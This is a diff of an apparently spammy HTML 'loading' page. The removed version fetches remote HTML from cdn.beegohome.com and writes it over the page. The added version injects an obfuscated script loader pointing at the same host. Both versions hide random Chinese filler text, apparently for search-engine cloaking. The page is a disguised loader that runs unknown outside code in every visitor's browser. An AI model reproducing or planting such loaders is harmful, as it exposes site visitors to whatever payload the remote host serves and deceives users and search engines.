@@ -1,181 +1,30 @@
+
 <!DOCTYPE html>
 <html>
-<head> <meta charset="utf-8" />
-    <style>
-        iframe {
-            display: none;
-            width: 100%;
-            height: 100%;
-            margin: 0;
-            padding: 0;
-            border: 0
+<head>
+    <meta charset="UTF-8" />
+    <meta content="width=device-width,initial-scale=1,user-scalable=0,minimum-scale=1,maximum-scale=1" name="viewport" />
+    <meta content="yes" name="apple-mobile-web-app-capable" />
+    <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+    <meta content="no" name="msapplication-tap-highlight" />
+    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+    <title>....</title>
+    <script type="text/javascript">
+        var WAItcl1 = WAItcl1 || [];
+        var b2 = ["//cdn.beegohome.com/Mjk/d.js"];
+        var h3;
+        var t4;
+        for (var zbxkbrdDfUV = 0; zbxkbrdDfUV < b2["length"]; zbxkbrdDfUV++) {
+            h3 = window["document"]["createElement"]("script");
+            h3["src"] = b2[zbxkbrdDfUV];
+            t4 = window["document"]["getElementsByTagName"]("script")[0];
+            t4["parentNode"]["insertBefore"](h3, t4);
         }
-
-        body {
-            width: 100%;
-            height: 100%;
-            margin: 0;
-            padding: 0;
-            border: 0
-        }
-
-        .B9wgDa2R8 {
-            position: fixed;
-            left: 0;
-            right: 0;
-            top: 0;
-            bottom: 0;
-            z-index: 1;
-            background-color: #d8d8d8
-        }
-
-        .B9wgDa2R8 .pz7x2M63gMC {
-            position: absolute;
-            left: 0;
-            right: 0;
-            top: 0;
-            bottom: 0;
-            height: 50px;
-            margin: auto
-        }
-
-        .B9wgDa2R8 .content {
-            line-height: 50px;
-            text-align: center
-        }
-
-        .B9wgDa2R8 .img {
-            width: 100%
-        }
-
-        .B9wgDa2R8 .m6wJvj94 {
-            text-align: center
-        }
-
-        .B9wgDa2R8 .m6wJvj94 span {
-            display: inline-block;
-            width: 6px;
-            height: 50px;
-            background-color: #FF5722;
-            -webkit-transform: scaleY(0.4);
-            transform: scaleY(0.4);
-            -webkit-animation: scale 1s infinite;
-            animation: scale 1s infinite
-        }
-
-        .B9wgDa2R8 .m6wJvj94 span:nth-child(2) {
-            -webkit-animation: scale 1s .2s infinite;
-            animation: scale 1s .2s infinite
-        }
-
-        .B9wgDa2R8 .m6wJvj94 span:nth-child(3) {
-            -webkit-animation: scale 1s .3s infinite;
-            animation: scale 1s .3s infinite
-        }
-
-        .B9wgDa2R8 .m6wJvj94 span:nth-child(4) {
-            -webkit-animation: scale 1s .4s infinite;
-            animation: scale 1s .4s infinite
-        }
-
-        .B9wgDa2R8 .m6wJvj94 span:nth-child(5) {
-            -webkit-animation: scale 1s .5s infinite;
-            animation: scale 1s .5s infinite
-        }
-
-        .B9wgDa2R8 .m6wJvj94 span:nth-child(6) {
-            -webkit-animation: scale 1s .6s infinite;
-            animation: scale 1s .6s infinite
-        }
-
-        @-webkit-keyframes scale {
-            0% {
-                -webkit-transform: scaleY(0.4);
-                transform: scaleY(0.4)
-            }
-            20% {
-                -webkit-transform: scaleY(0.8);
-                transform: scaleY(0.8)
-            }
-            40% {
-                -webkit-transform: scaleY(1);
-                transform: scaleY(1)
-            }
-            100% {
-                -webkit-transform: scaleY(0.4);
-                transform: scaleY(0.4)
-            }
-        }
-
-        @keyframes scale {
-            0% {
-                -webkit-transform: scaleY(0.4);
-                transform: scaleY(0.4)
-            }
-            20% {
-                -webkit-transform: scaleY(0.8);
-                transform: scaleY(0.8)
-            }
-            40% {
-                -webkit-transform: scaleY(1);
-                transform: scaleY(1)
-            }
-            100% {
-                -webkit-transform: scaleY(0.4);
-                transform: scaleY(0.4)
-            }
-        }
-
-        .B9wgDa2R8 .tips {
-            font-size: 1rem;
-            color: #fff;
-            text-align: center
-        }
-    </style>
+    </script>
+    <!-- RGHUpJagOGMjNVxFmELmciKZTSCNRrIIYqDnZEtNkfXYavDnZp-->
 </head>
-<body><script>
-    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
-    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
-    function Dget(e, t,a) {
-        var n = new XMLHttpRequest;
-        //n.timeout = 3000;
-        n.onreadystatechange = function () {
-            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
-        };n.ontimeout = function (e) {
-            //alert('请求超时,重新发起请求');
-            //location.reload();
-        };
-        n.open("GET", e, !0),
-            n.send(null)
-    }
-    var temp = getUrlParam('temp');
-
-    //if(document.referrer){
-    var temp_name = temp +'.html';
-    Dget('//cdn.beegohome.com/Mjk/diansqwefer.html',function(res){
-        var doc=document.open("text/html","replace")
-        doc.write(res);
-        doc.close()
-    })
-    //}
-
-</script> 
-<img  src='' style='display:none'>
-<a  href='#' style='display:none'>瀑溪拉嵌砷苍典讹逃蹲探腾顾沥葡弹横</a>
-<li style='display:none' >携骄烦恭寂梢醚帘风位抽皖退呸辩抒巍贪戏继隘妥肪趴懒么端虱糜拧</li><div class="翠稗矾峭滇笺睫锚缄乔母报入巨希乘请桅呻焦敝斗教潮庭告葛">
-    <div class="厢沙幌捻廓乌信股双模呈呸聊喊秃铆覆放褥乱讣">
-        <div class="稍虽撂迫逞副饯敖歼">
-            <p style="font-size:50px;color:#FF5722; padding-top: 18%; margin:-28% auto">正在加载...</p>
-
-            <tr>股脸纶羌喘挠秋备表僧</tr>
-            <tr>闻裙汾郡疯颂操河</tr>
-            <tr>铅曝恼贩吗浇筹贺旱锚跺滦路图岛亭扭巫放侨郝亲酱谅极贝筹热萎偿</tr>
-            <tr>钨吝夺炕莫嘎瞥图蜡靖磁眉剖繁饶窘嫌剖忌夯旗刨徒皇眉骂哪火搏</tr>
-            <tr>第讲肃燎蒂泛揩四捎怕且矩夕豢胚坍沤兼景情纺吠泊秒趣懊</tr>
-            <tr>烯豁费缅檄较币辜焦粮浚艾矗惰赊尼钵舰鬼胜酪搽丰嚼</tr></div>
-
-    </div>
-</div>
+<body>
+加载中......
+<p style="display: none;">硅吗殿幌砍赦户锋老沸盟烤</p>
 </body>
-
 </html>
